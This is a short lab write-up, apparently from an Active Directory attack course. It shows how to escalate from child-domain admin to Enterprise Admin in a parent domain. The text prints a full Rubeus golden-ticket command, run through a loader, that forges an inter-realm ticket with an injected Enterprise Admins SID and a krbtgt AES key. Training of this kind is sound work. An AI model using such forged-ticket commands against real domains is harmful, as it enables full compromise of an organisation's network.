
Task 

• Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, techcorp.local using the krbtgt hash of us.techcorp.local.



We already have the krbtgt hash of us.techcorp.local. Let's create the inter-realm TGT and inject. Run the below command from an elevated shell on the student VM:


```
echo %Pwn% golden
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /ptt
```

![[Pasted image 20250323202009.png]]

![[Pasted image 20250323202132.png]]

